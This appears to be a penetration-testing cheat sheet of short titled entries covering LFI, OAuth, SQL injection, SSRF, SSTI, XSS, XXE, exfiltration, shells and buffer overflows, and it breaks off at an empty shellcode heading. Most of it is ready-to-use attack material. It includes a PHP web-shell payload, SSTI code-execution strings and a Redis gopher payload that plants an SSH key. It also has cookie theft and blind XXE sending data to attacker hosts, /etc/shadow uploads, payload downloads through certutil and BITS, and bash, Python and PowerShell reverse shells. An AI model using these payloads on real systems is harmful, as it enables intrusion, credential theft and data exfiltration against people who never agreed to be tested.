http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=config.php

Decode output:

echo "base64_output_here" | base64 -d

data:// — inline payload for RCE (requires allow_url_include=On):

http://10.10.10.10/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id

The base64 decodes to <?php system($_GET['cmd']);?>.

php://input — POST body becomes the included file:

curl -X POST "http://10.10.10.10/index.php?page=php://input&cmd=id" --data '<?php system($_GET["cmd"]); ?>'

expect:// — direct command execution (requires expect extension, uncommon but devastating):

http://10.10.10.10/index.php?page=expect://id

zip:// / phar:// — execute code from uploaded archives:

http://10.10.10.10/index.php?page=zip://uploads/shell.zip#shell.php
http://10.10.10.10/index.php?page=phar://uploads/shell.phar/shell

Useful when the app accepts a file upload but blocks .php — rename your PHP shell into a .zip or .phar and trigger it through the wrapper.

docs.title: Fimap
docs.text: fimap -u "http://10.10.10.10/index.php?page="

docs.title: LFI Suite
docs.text: python3 LFISuite.py

docs.title: Commix
docs.text: commix --url "http://10.10.10.10/index.php?page=" --level 3

docs.title: OAuth Exploitation
docs.text:
Tip

Always check if redirect_uri validation is loose — some apps accept any subdomain (evil.victim.com) or path traversal (victim.com/../attacker.com). State parameter missing? Try CSRF on the authorization flow.

Watch out

OAuth bugs often require user interaction to exploit. In a pentest context, confirm with the client whether simulated phishing is in scope before demonstrating the full chain.

docs.title: Using Burp Suite
docs.text:
• Intercept authentication requests and look for OAuth parameters such as client_id, redirect_uri, and response_type.
  • Check for insecure redirect URIs that allow open redirection.

docs.title: Extracting OAuth Tokens
docs.text: curl -v "http://10.10.10.10/oauth/authorize?client_id=123&response_type=token&redirect_uri=http://attacker.com"

docs.title: Redirect URI Manipulation
docs.text:
If the redirect_uri parameter is not properly validated, redirect tokens to a malicious site:

http://10.10.10.10/oauth/authorize?client_id=123&response_type=token&redirect_uri=http://attacker.com

docs.title: Impersonating Users with Stolen Tokens
docs.text: curl -H "Authorization: Bearer <stolen_token>" http://10.10.10.10/api

docs.title: Token Leakage via Referrer Headers
docs.text: If OAuth tokens are sent in the URL, they may be leaked via HTTP Referer headers. Visit an attacker-controlled site while logged into the OAuth service — the Referer header may contain the token.

docs.title: Token Reuse Attack
docs.text:
Test if expired or revoked tokens are still accepted:

curl -H "Authorization: Bearer <expired_token>" http://10.10.10.10/api

docs.title: Hardcoded / Leaked Client Secrets
docs.text:
Client secrets are often leaked in public repos, decompiled mobile apps, or SPA bundles. The secret itself is the credential — no cracking required.

# Grep decompiled APK or frontend JS for known parameter names
trufflehog filesystem ./extracted_app/
grep -rE 'client[_-]?secret|oauth[_-]?secret' ./src/

Confirm the stolen secret works by requesting a token with the client_credentials grant:

curl -X POST http://10.10.10.10/oauth/token \
  -d "grant_type=client_credentials" \
  -d "client_id=<leaked_id>" \
  -d "client_secret=<leaked_secret>"

If a token comes back, the client is compromised — you can issue access tokens with the scopes that client was granted.

docs.title: PKCE Downgrade / Missing PKCE
docs.text:
PKCE (RFC 7636) binds an authorization code to the client that started the flow. If the server accepts an auth code without a code_verifier, or accepts any verifier, an attacker who intercepts the code (via redirect_uri abuse or open redirect) can redeem it.

Test by omitting code_verifier at the token endpoint:

curl -X POST http://10.10.10.10/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=<intercepted_code>" \
  -d "client_id=<client_id>" \
  -d "redirect_uri=http://attacker.com/cb"

If the server returns a token, PKCE is not enforced.

docs.title: Authorization Code Injection
docs.text:
When a legitimate user completes the OAuth flow, their auth code is sent to the redirect_uri. If the token endpoint doesn't validate that the code was issued to the attacker's session (no PKCE, no state binding), an attacker who steals a victim's code — typically via referer leak or XSS against the callback — can redeem it from their own session and receive the victim's access token.

The full chain typically looks like: open redirect on redirect_uri → code leaks to attacker → attacker POSTs to /token → receives victim's token.

docs.title: SQLMap
docs.text:
Tip

Use --technique=B (boolean-based blind) first — it's quieter than time-based. Switch to --technique=T only if boolean gives no results.

Watch out

--level 5 --risk 3 generates a lot of noise. Start with defaults and escalate only if needed. On authenticated endpoints, always pass the session cookie with --cookie or --headers, not just -u.

Goal Flag Dump a specific table --dump -T users -D mydb Find injectable parameters automatically --forms --crawl=2 Test authenticated endpoint --cookie="session=abc123" Avoid WAF detection --tamper=space2comment,between OS shell (if stacked queries work) --os-shell

docs.title: Basic Usage
docs.text:
sqlmap -u "http://10.10.10.10/page.php?id=1" --batch --dbs
  • -u → Specifies the target URL.
  • --batch → Runs in non-interactive mode.
  • --dbs → Retrieves the list of available databases.

docs.title: Saved Request File (-r)
docs.text:
The most reliable way to test authenticated, POST, JSON, or multi-header endpoints. Save a Burp/ZAP request to a file and point sqlmap at it — sqlmap replays headers, cookies, and body exactly as captured. Use * to mark specific injection points.

# Save request from Burp: right-click → Copy to file → request.txt
sqlmap -r request.txt --batch --dbs

Mark the injectable field explicitly:

POST /api/search HTTP/1.1
Host: 10.10.10.10
Cookie: session=abc123
Content-Type: application/json

{"query":"*","page":1}

sqlmap -r request.txt --batch --dbs

The * in the body tells sqlmap exactly where to inject, which is essential for JSON or XML bodies sqlmap wouldn't otherwise parse correctly.

docs.title: Level and Risk Tuning
docs.text:
Default --level 1 --risk 1 tests only GET/POST parameters with low-risk payloads. Escalate only when defaults find nothing:

  • --level 2 adds Cookie header testing.
  • --level 3 adds User-Agent and Referer.
  • --level 5 --risk 3 tests every header and every technique (including heavy time-based and stacked-query payloads that can lock accounts or crash apps).
sqlmap -r request.txt --level 3 --risk 2 --batch

docs.title: Enumerating Database Tables
docs.text: sqlmap -u "http://10.10.10.10/page.php?id=1" -D target_db --tables

docs.title: Dumping Table Data
docs.text: sqlmap -u "http://10.10.10.10/page.php?id=1" -D target_db -T users --dump

docs.title: Extracting User Credentials
docs.text: sqlmap -u "http://10.10.10.10/page.php?id=1" -D target_db -T users -C username,password --dump

docs.title: Checking for Privilege Escalation
docs.text: sqlmap -u "http://10.10.10.10/page.php?id=1" --privileges

docs.title: Using SQLMap with Cookies
docs.text: sqlmap -u "http://10.10.10.10/page.php?id=1" --cookie="PHPSESSID=123456" --dbs

docs.title: Bypassing WAF and IDS
docs.text:
sqlmap -u "http://10.10.10.10/page.php?id=1" --random-agent --tamper="between,space2comment"
  • --random-agent → Uses a random user-agent to evade detection.
  • --tamper → Applies tamper scripts to obfuscate payloads.

docs.title: SSRF (Server-Side Request Forgery)
docs.text:
Tip

When testing SSRF, start with http://127.0.0.1/ and http://169.254.169.254/ (AWS metadata). If the app blocks IPs, try http://localhost/, http://[::1]/, or DNS rebinding.

Watch out

Blind SSRF is easy to miss — use a Burp Collaborator or interactsh URL to confirm out-of-band connections even when there's no visible response.

docs.title: Using Burp Suite
docs.text:
• Intercept HTTP requests containing parameters like url, redirect, or link.
  • Modify the parameter to point to an attacker-controlled server.

docs.title: Basic SSRF Test
docs.text: curl -X GET "http://10.10.10.10/page?url=http://attacker.com"

docs.title: Confirming Blind SSRF Out-of-Band
docs.text:
Point the target at a Burp Collaborator or interactsh URL. Any DNS or HTTP hit confirms the request left the server.

# Start a listener
interactsh-client

Then inject the generated payload URL:

curl "http://10.10.10.10/page?url=http://abc123.oast.live/"

If you see a DNS query but no HTTP hit, the server resolves URLs but doesn't fetch them (often a WAF or egress filter) — DNS exfiltration via hostname encoding is still possible.

docs.title: Cloud Metadata Services
docs.text:
# AWS IMDSv1
curl "http://10.10.10.10/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# AWS IMDSv2 — requires PUT for token, usually blocked via SSRF. IMDSv1 fallback is the bug.

# GCP (requires Metadata-Flavor header — only exploitable if app forwards headers)
curl "http://10.10.10.10/page?url=http://metadata.google.internal/computeMetadata/v1/"

# Azure
curl "http://10.10.10.10/page?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# DigitalOcean
curl "http://10.10.10.10/page?url=http://169.254.169.254/metadata/v1/"

docs.title: Scanning Internal Services
docs.text:
curl "http://10.10.10.10/page?url=http://127.0.0.1:22"
curl "http://10.10.10.10/page?url=http://127.0.0.1:6379"   # Redis
curl "http://10.10.10.10/page?url=http://127.0.0.1:9200"   # Elasticsearch

Use response time or length to distinguish open vs. closed ports when errors are generic.

docs.title: Local File Read
docs.text: http://10.10.10.10/page?url=file:///etc/passwd

docs.title: Gopher — Pivot to TCP Services
docs.text:
gopher:// lets the vulnerable server send arbitrary bytes over TCP. Classic pivot into internal Redis, MySQL, SMTP, or any unauth line-based protocol.

Write an SSH key to a gopher-accessible Redis:

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0A1%0D%0A%2467%0D%0A%0A%0A%0Assh-rsa%20AAAA...%20attacker%40kali%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2411%0D%0A/root/.ssh/%0D%0A

Generate these payloads with Gopherus:

gopherus --exploit redis
gopherus --exploit mysql
gopherus --exploit smtp

docs.title: URL Encoding
docs.text: http://10.10.10.10/page?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data

docs.title: Alternate IP Representations
docs.text:
http://10.10.10.10/page?url=http://2130706433          # decimal 127.0.0.1
http://10.10.10.10/page?url=http://0x7f000001          # hex
http://10.10.10.10/page?url=http://0177.0.0.1          # octal
http://10.10.10.10/page?url=http://[::ffff:127.0.0.1]  # IPv6-mapped
http://10.10.10.10/page?url=http://localtest.me        # DNS resolves to 127.0.0.1

docs.title: DNS Rebinding
docs.text: If the app validates the hostname's DNS resolution before fetching, use a rebinding service (rbndr.us, 1u.ms) that alternates between a public IP (passes check) and 127.0.0.1 (actual fetch).

docs.title: Server-Side Template Injection (SSTI)
docs.text: Inject {{7*7}}, ${7*7}, and <%= 7*7 %> into every user-controlled input that reflects output. A 49 response confirms template execution. Identify the engine from error messages or HTTP response headers before trying RCE payloads — wrong engine = wasted time.

docs.title: Identify the Template Engine
docs.text: Probe Reflected as 49 → Engine {{7*7}} Jinja2 (Python/Flask), Twig (PHP) {{7*'7'}} Jinja2 → 7777777 / Twig → 49 — differentiates the two ${7*7} Freemarker, Velocity (Java) <%= 7*7 %> ERB (Ruby/Rails) #{7*7} Pebble, some Ruby engines

docs.title: Confirm Execution
docs.text:
{{config}}
{{self.__dict__}}

docs.title: RCE
docs.text:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

If the above is filtered, enumerate subclasses and find subprocess.Popen:

{{''.__class__.__mro__[1].__subclasses__()}}

Then call it by index (index varies by Python version):

{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

docs.title: Confirm Execution
docs.text: {{_self.env.display("id")}}

docs.title: RCE
docs.text:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}

docs.title: RCE
docs.text: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

docs.title: RCE
docs.text:
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').read %>

docs.title: RCE
docs.text: {% import os %}{{os.system('id')}}

docs.title: Filter Bypasses (Jinja2)
docs.text:
If _, ., or class keywords are filtered, use hex encoding:

{{request|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|...}}

Use tplmap to automate detection and exploitation:

tplmap -u "http://10.10.10.10/page?name=test" --os-shell
tplmap -u "http://10.10.10.10/page?name=test" -e Jinja2

docs.title: Cross-Site Scripting (XSS)
docs.text:
Tip

If <script> is filtered, test event handlers first: <img src=x onerror=alert(1)>. CSP blocking inline scripts? Check for JSONP endpoints or script-src with unsafe-eval.

Watch out

Stored XSS that fires in an admin panel is high impact but easy to miss — always check if your payload lands in an area only admins see.

docs.title: Check CSP First
docs.text:
Before wasting time on payloads, read the Content-Security-Policy header — it tells you what will and won't fire:

curl -sI http://10.10.10.10 | grep -i content-security
  • No CSP header → anything works, start with any payload below.
  • script-src 'self' → inline <script> blocked; look for JSONP endpoints and file uploads on the same origin.
  • script-src 'unsafe-inline' → inline scripts still execute.
  • script-src 'unsafe-eval' → eval() / Function() / setTimeout("string") work, so framework gadgets become exploitable.

docs.title: Basic Payload Testing
docs.text:
Lead with event handlers — they fire on modern stacks where <script> is filtered or CSP blocks inline script tags:

<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>

If the injection lands inside an attribute, break out first:

" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='

javascript: URIs in href/src attributes:

<a href="javascript:alert(1)">Click Me</a>
"><a href="javascript:alert(1)">Click Me</a>

Fallbacks when event handlers are stripped:

<script>alert(1)</script>
"><script>alert(1)</script>
<textarea></textarea><script>alert(1)</script>

Encoding variations (useful when the reflection point double-decodes):

%3Cscript%3Ealert(1)%3C%2Fscript%3E
<script>alert(1)</script>

docs.title: XSSer
docs.text: xsser --url "http://10.10.10.10/index.php?q=" --payload="<script>alert(1)</script>"

docs.title: Dalfox
docs.text: dalfox url "http://10.10.10.10/index.php?q=" -b https://xsshunter.com

docs.title: Burp Suite
docs.text:
• Capture requests and test with the built-in XSS scanner.
  • Modify input fields and observe reflected responses.

docs.title: Stealing Cookies
docs.text:
If session cookies are not marked HttpOnly, steal them:

<img src=x onerror=fetch('http://<attacker-ip>:<port>/?c='+document.cookie)>

Start a listener to catch the response:

nc -lvnp 9008

docs.title: Payload Encoding for Evasion
docs.text:
URL encoding:

%3Cscript%3Ealert(1)%3C%2Fscript%3E

Base64 encoded payload:

<script>eval(atob('YWxlcnQoMSk='))</script>

docs.title: Evading WAFs
docs.text:
• Use alternate event handlers: onmouseover, onfocus, onload.
  • Obfuscate JavaScript: eval(String.fromCharCode(97,108,101,114,116,40,49,41));
  • Use nested tags: <sVg oNloAd=alert(1)>

docs.title: Tools
docs.text:
• XSSHunter – Payloads for blind XSS and credential theft.
  • BeEF (Browser Exploitation Framework) – Client-side exploitation and control.
  • Dalfox – Automated XSS scanner with OOB support.

docs.title: XXE (XML External Entity) Injection
docs.text:
Tip

If classic XXE is blocked, try blind XXE with out-of-band exfiltration via DNS. Many WAFs block <!ENTITY in the body but miss it in DTD references.

Watch out

SVG file upload fields often accept XML — test XXE there if the main request body is JSON.

docs.title: Identifying XXE Vulnerabilities
docs.text:
Inject payloads into XML-based input fields:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>

docs.title: Using Burp Suite
docs.text:
1. Intercept a request containing XML input.
  2. Modify the request by injecting an external entity payload.
  3. Observe the server response to check if external entities are processed.

docs.title: Fuzzing for XXE
docs.text: ffuf -u "http://10.10.10.10/xmlapi?xml=FUZZ" -w /usr/share/seclists/Fuzzing/XXE.txt -mc all -fc 404

docs.title: Reading Files
docs.text:
<!DOCTYPE data [
  <!ENTITY read SYSTEM "file:///etc/passwd">
]>
<data>&read;</data>

Windows:

<!DOCTYPE data [
  <!ENTITY read SYSTEM "file:///C:/Windows/win.ini">
]>
<data>&read;</data>

docs.title: Blind XXE (Out-of-Band)
docs.text:
<!DOCTYPE foo [
  <!ENTITY % payload SYSTEM "http://attacker.com/exfil.dtd">
  %payload;
]>

Host exfil.dtd on an attacker-controlled server:

<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % send SYSTEM "http://attacker.com/?data=%data;">
%send;

docs.title: SSRF via XXE
docs.text:
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8000/admin">
]>
<root>&xxe;</root>

docs.title: XXEinjector
docs.text: python3 XXEinjector.py -u "http://10.10.10.10/vulnerable.xml" --data "xml_payload"

docs.title: Nuclei XXE Detection
docs.text: nuclei -t technologies/xxe-detection.yaml -u http://10.10.10.10

docs.title: Burp Suite
docs.text:
Tip

Repeater keyboard shortcuts save significant time: Ctrl+R to send to Repeater, Ctrl+Space to re-send, Ctrl+Shift+U to URL-decode selected text.

Task Burp feature Intercept and modify a request once Proxy → Intercept Replay and tweak a request repeatedly Send to Repeater (Ctrl+R) Fuzz a parameter with a wordlist Send to Intruder → Sniper mode Scan for common web vulns automatically Scanner (Pro only) Test CSRF token bypass Proxy → Match and Replace Compare two responses Comparer

docs.title: Adding Cookies to Every Request
docs.text:
1. Burp > Settings > Sessions > Session handling rules > Add
  2. Add a rule in the Details tab → Set a specific cookie or parameter value
    • Name: COOKIE
    • value: VALUE
    • Check box if not already present, add as a: cookie
  3. In the Scope tab, select all Tools scope and the URL scope

docs.title: Sorting Intruder Payloads
docs.text: When configuring an Intruder attack, send the payload through Repeater first to see the expected or errored response. Use grep match in Intruder settings to filter by this HTTP response if present.

docs.title: EyeWitness
docs.text:
Tip

EyeWitness is most useful after an nmap scan — pipe the XML output directly: eyewitness --web -x nmap.xml. The HTML report lets you quickly identify interesting services without opening each one manually.

docs.title: Basic Usage
docs.text: eyewitness --web -f targets.txt -d output --timeout 10

docs.title: Scanning a Single URL
docs.text: eyewitness --web -u http://10.10.10.10 -d output

docs.title: Scanning RDP and VNC Services
docs.text: eyewitness --rdp --vnc -f targets.txt -d output

docs.title: Scanning Nmap XML Output
docs.text: eyewitness -x scan.xml -d output

docs.title: Headless Report
docs.text: eyewitness --headless -f targets.txt -d output

docs.title: Nikto
docs.text:
Tip

Nikto is loud and slow — use it when you're not worried about detection. Pair with -o output.html to save results. For a faster scan, use -Tuning 9 to check for SQL injection only.

Watch out

Nikto generates a lot of false positives. Cross-reference findings manually before reporting — especially header-based findings.

docs.title: Basic Usage
docs.text: nikto -h http://10.10.10.10

docs.title: Scanning a Specific Port
docs.text: nikto -h http://10.10.10.10 -p 8080

docs.title: Using a Proxy
docs.text: nikto -h http://10.10.10.10 -useproxy http://127.0.0.1:8080

docs.title: Saving Scan Results
docs.text: nikto -h http://10.10.10.10 -o results.txt -Format txt

docs.title: Disabling SSL Certificate Verification
docs.text: nikto -h https://10.10.10.10 -nossl

docs.title: Running a Stealthy Scan
docs.text:
nikto -h http://10.10.10.10 -Tuning 4
  • -Tuning 4 → Focuses on fewer but more targeted checks.

docs.title: Specifying a User-Agent
docs.text: nikto -h http://10.10.10.10 -UserAgent "Mozilla/5.0"

docs.title: Limiting Requests Per Second
docs.text:
nikto -h http://10.10.10.10 -delay 2
  • -delay 2 → Waits 2 seconds between requests to avoid detection.

docs.title: Data Exfiltration
docs.text: Data exfiltration covers moving files and loot off a compromised host to your attacker machine. The technique depends on what the target allows outbound — HTTP/S works almost everywhere, but DNS and ICMP-based exfil are fallbacks when everything else is filtered.

docs.title: 1. Test Outbound Connectivity
docs.text:
Before committing to a transfer method, confirm what's allowed outbound from the target:

# From target — can it reach you?
curl http://<attacker-ip>/test
ping -c 1 <attacker-ip>
nslookup <attacker-ip>

If nothing works, check if a proxy or internal host has outbound access and pivot through it.

docs.title: 2. Choose a Transfer Method
docs.text: Situation Method HTTP/S allowed outbound Python HTTP server + curl/wget/iwr SMB allowed Impacket smbserver SSH available scp or sftp Only DNS outbound DNS exfil (dnscat2, iodine) Fully restricted Encode data in ICMP or encode to clipboard

docs.title: 3. Serve Files from Attacker Machine
docs.text:
python3 -m http.server 80
python3 -m http.server 443        # pair with an SSL wrapper if needed
impacket-smbserver PWN /home/user/loot -smb2support

docs.title: 4. Pull Files from the Target
docs.text:
Linux target:

wget http://<attacker-ip>/file -O /tmp/file
curl http://<attacker-ip>/file -o /tmp/file

Windows target:

iwr -uri http://<attacker-ip>/file -OutFile C:\Temp\file
certutil -urlcache -split -f http://<attacker-ip>/file C:\Temp\file

Via SMB:

copy \\<attacker-ip>\PWN\file C:\Temp\file

See File Transfer Techniques for a full reference including base64 encoding and netcat transfers.

docs.title: 5. Exfiltrate Loot Off the Target
docs.text:
Push files to attacker machine via curl:

curl -F "file=@/etc/shadow" http://<attacker-ip>/upload

Via SMB (Windows → attacker):

copy C:\Temp\loot.txt \\<attacker-ip>\PWN\loot.txt

Via SCP (if SSH is available):

scp root@10.10.10.10:/etc/shadow /tmp/shadow

See Secure Transfers for encrypted channels and covert exfiltration techniques.

Real-world

On real engagements, avoid exfiltrating actual client data unless explicitly required to demonstrate impact. Screenshot directory listings or hash files to prove access — exfiltrating real data creates legal and compliance risk.

docs.title: File Transfer Techniques
docs.text:
Method When to use python3 -m http.server Fastest for pulling files to attacker from Linux target impacket-smbserver share . Windows targets — mount as a drive letter curl -T file http://<attacker-ip>/upload Pushing files to attacker-controlled server nc -w3 <attacker-ip> 4444 < file Simple, no dependencies Certutil (Windows) certutil -urlcache -split -f http://<attacker-ip>/file out DNS exfil When only port 53 outbound is allowed

Tip

For Windows file transfers, certutil and bitsadmin are LOLBins — no dropped binaries. certutil -urlcache -split -f <url> <output> works on most Windows versions.

docs.title: Linux to Linux
docs.text:
# Sender
nc -lvnp 4444 < secret.txt

# Receiver
nc <attacker-ip> 4444 > retrieved.txt

docs.title: Windows to Linux
docs.text:
Windows doesn't ship with netcat — PowerShell TCP client is the drop-in replacement:

# Sender (Windows, no external binaries)
$c = New-Object System.Net.Sockets.TCPClient('<attacker-ip>',4444)
$s = $c.GetStream()
$b = [IO.File]::ReadAllBytes('C:\Users\Public\secret.txt')
$s.Write($b,0,$b.Length); $s.Close()

# Receiver (Linux)
nc -lvnp 4444 > retrieved.txt

docs.title: Linux to Linux
docs.text: scp secret.txt <user>@<attacker-ip>:/tmp/

docs.title: Windows to Linux
docs.text: scp C:\Users\Public\secret.txt <user>@<attacker-ip>:/home/<user>/

docs.title: Map a Network Drive (Windows)
docs.text:
net use \\<attacker-ip>\shared_folder /user:attacker secretpassword
copy C:\sensitive_data.txt \\<attacker-ip>\shared_folder\

docs.title: SMBClient (Linux)
docs.text: smbclient -U <user> //<attacker-ip>/C$ -c 'put backdoor.exe'

docs.title: Interactive Upload
docs.text:
ftp 10.10.10.10
put secret.txt

docs.title: Automated via PowerShell
docs.text:
$WebClient = New-Object System.Net.WebClient
$WebClient.UploadFile("ftp://<attacker-ip>/secret.txt", "C:\sensitive.txt")

docs.title: Python HTTP Server (attacker-side)
docs.text: python3 -m http.server 8000

docs.title: Download on Target
docs.text:
wget http://<attacker-ip>:8000/secret.txt -O /tmp/secret.txt
curl http://<attacker-ip>/malware.exe -o /tmp/malware.exe

docs.title: Download File
docs.text: Invoke-WebRequest -Uri "http://<attacker-ip>/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"

docs.title: Certutil (LOLBin)
docs.text: certutil -urlcache -split -f http://<attacker-ip>/payload.exe C:\Windows\Temp\payload.exe

docs.title: BITS Transfer (LOLBin)
docs.text:
Lower-signature than certutil on modern EDR. Uses the Background Intelligent Transfer Service — the same one Windows Update uses.

Start-BitsTransfer -Source http://<attacker-ip>/payload.exe -Destination C:\Windows\Temp\payload.exe
bitsadmin /transfer job /download /priority foreground http://<attacker-ip>/payload.exe C:\Windows\Temp\payload.exe

docs.title: Upload via WebClient / Invoke-RestMethod
docs.text:
# Upload
(New-Object System.Net.WebClient).UploadFile('http://<attacker-ip>/upload', 'C:\loot.zip')
Invoke-RestMethod -Uri http://<attacker-ip>/upload -Method POST -InFile C:\loot.zip

docs.title: Secure Transfers
docs.text:
Tip

Use scp or sftp when SSH is available — fastest and encrypted by default. For exfiltrating over HTTP without detection, encode files with base64 and send as POST body parameters rather than binary uploads.

docs.title: SCP
docs.text:
# Linux to Linux
scp secret.txt <user>@<attacker-ip>:/tmp/

# Windows to Linux
scp C:\Users\Public\secret.txt <user>@<attacker-ip>:/home/<user>/

docs.title: Interactive
docs.text:
sftp <user>@<attacker-ip>
put secret.txt
exit

docs.title: Automated
docs.text:
echo "put secret.txt" > sftp_commands.txt
sftp -b sftp_commands.txt <user>@<attacker-ip>

docs.title: OpenSSL File Encryption
docs.text:
# Encrypt
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -k SuperSecretKey

# Decrypt after transfer
openssl enc -aes-256-cbc -d -in secret.enc -out secret.txt -k SuperSecretKey

docs.title: GPG Encryption
docs.text:
# Encrypt
gpg --output secret.gpg --encrypt --recipient attacker@example.com secret.txt

# Decrypt after transfer
gpg --output secret.txt --decrypt secret.gpg

docs.title: rsync over SSH
docs.text: rsync -avz -e ssh /path/to/data <user>@<attacker-ip>:/tmp/

docs.title: Local Port Forward for File Transfer
docs.text:
ssh -L 9001:10.10.10.10:22 <user>@<attacker-ip>
scp -P 9001 <user>@localhost:/sensitive/data.txt /safe/location/

docs.title: SOCKS5 Proxy
docs.text:
ssh -D 1080 <user>@<attacker-ip>

Configure curl or wget to use socks5://127.0.0.1:1080.

docs.title: HTTPS Transfers
docs.text:
Invoke-WebRequest -Uri "https://secure-server.com/data" -OutFile "C:\Users\Public\data.txt"

curl -k -O https://secure-server.com/secret.txt

docs.title: Exploitation
docs.text: Exploitation is the phase where discovered vulnerabilities turn into access. The goal isn't just code execution — it's a stable, interactive shell you can work from. Most exploitation paths converge on one of three routes: web shell, reverse shell via a known exploit, or credential-based access.

docs.title: 1. Choose the Exploitation Path
docs.text:
Match the technique to what you found during enumeration:

Foothold Approach Web application vuln (RCE, file upload) Web shell → upgrade to reverse shell Known service CVE (EternalBlue, etc.) Metasploit module or manual exploit Valid credentials (SSH, WinRM, SMB) Direct shell — no exploit needed Binary with overflow or injection Manual exploit or shellcode injection Weak creds on web login Brute-force → authenticated RCE

docs.title: 2. Get a Shell
docs.text:
Reverse shell one-liners (catch with nc -lvnp <port>):

bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker-ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

Windows PowerShell:

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker-ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

See Bind & Reverse Shells for a full reference and Web Shells for upload-based access.

docs.title: 3. Stabilize the Shell
docs.text:
A raw netcat shell drops on Ctrl+C and has no tab completion. Stabilize immediately.

python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm

Or upgrade to a fully interactive shell with socat:

# On attacker
socat file:`tty`,raw,echo=0 tcp-listen:<port>

# On target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker-ip>:<port>

Real-world

Always stabilize before running anything interactive. Tools like sudo -l, su, and password prompts will behave unpredictably in a raw shell and can lock you out.

docs.title: 4. Credential-Based Exploitation
docs.text:
If you have valid credentials, you often don't need an exploit at all.

ssh <user>@10.10.10.10
evil-winrm -i 10.10.10.10 -u <user> -p '<pass>'
impacket-psexec CORP/<user>:'<pass>'@10.10.10.10

See Brute-Force Cracking for offline hash cracking and spray workflows.

docs.title: 5. Binary Exploitation
docs.text:
For targets with custom binaries, memory corruption, or CTF-style pwn challenges.

  • Identify protections: checksec binary
  • Find the offset: pattern_create / pattern_offset in pwndbg
  • Control EIP/RIP, redirect to shellcode or ROP chain

See Buffer Overflows and ELF & DLL Analysis.

Watch out

Kernel exploits and memory corruption bugs can crash the target. Test in a local copy first if possible. On real engagements, get explicit approval before running any exploit that could cause instability.

docs.title: 6. Escape Restricted Environments
docs.text:
If you land in a restricted shell (rbash, rvsh, limited sudo, Docker container):

echo $SHELL
sudo -l
find / -perm -4000 2>/dev/null

See Escaping Restricted Shells for GTFOBins-based escapes, Python/vi/awk breakouts, and container escapes.

docs.title: Buffer Overflows
docs.text:
Tip

Use pwntools for Linux exploits — it handles offset calculation, shellcode injection, and ROP chain building. For Windows, mona.py in Immunity Debugger is still the go-to for finding offsets and bad chars.

Watch out

Bad characters vary per exploit. Always run the full bad char test (\x00 through \xff) and compare against a clean string in the debugger — skipping this is the most common reason a working exploit fails on delivery.

Scope

This page covers the classic x86 stack overflow workflow (EIP overwrite, JMP ESP, direct shellcode) — still the OSCP/CTF-relevant pattern. Modern x64 targets with full mitigations (NX, ASLR, PIE, stack canaries, CET) require ROP/JOP, info leaks, and format string primitives that are out of scope here. Always run checksec first — if canaries and PIE are on, the path is not a plain buffer overflow.

docs.title: Identifying Buffer Overflow Vulnerabilities
docs.text:
searchsploit buffer overflow
searchsploit <software-name>
checksec --file=<binary>

docs.title: Fuzzing
docs.text:
#!/usr/bin/python3
import sys, socket

target = "10.10.10.10"
port = <port>

buffer = b"A" * 100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(buffer)
        buffer += b"A" * 100
        s.close()
    except:
        print(f"Crash at {len(buffer)} bytes")
        sys.exit()

docs.title: Determining Offset
docs.text:
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <buffer-size>

Send the pattern and note where it crashes. Retrieve the value in the EIP register:

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP-value>

docs.title: Overwriting the Return Address
docs.text:
Locate a valid JMP ESP instruction:

msf-nasm_shell
nasm> JMP ESP

Insert the memory address in little-endian format (e.g., \x83\x0c\x09\x10).

docs.title: Injecting Shellcode
docs.text:
